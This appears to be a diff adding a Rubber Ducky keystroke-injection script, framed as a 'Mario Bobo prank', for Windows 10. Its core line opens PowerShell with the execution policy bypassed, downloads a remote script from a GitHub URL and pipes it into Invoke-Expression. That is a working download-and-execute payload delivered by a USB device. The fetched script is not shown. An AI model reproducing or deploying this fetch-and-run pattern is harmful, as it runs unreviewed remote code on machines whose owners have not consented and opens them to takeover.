@@ -1,0 +1,14 @@
+REM Title: Mario Bobo Prank
+REM Author: gootalive743
+REM Description: This script executes the Mario Bobo prank in PowerShell
+REM Target: Windows 10
+
+REM Setup for Ducky script
+DEFAULT_DELAY 100
+
+REM Open PowerShell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C irm https://raw.githubusercontent.com/gootalive743/MarioBobo-Prank/main/main.ps1 | iex
+ENTER
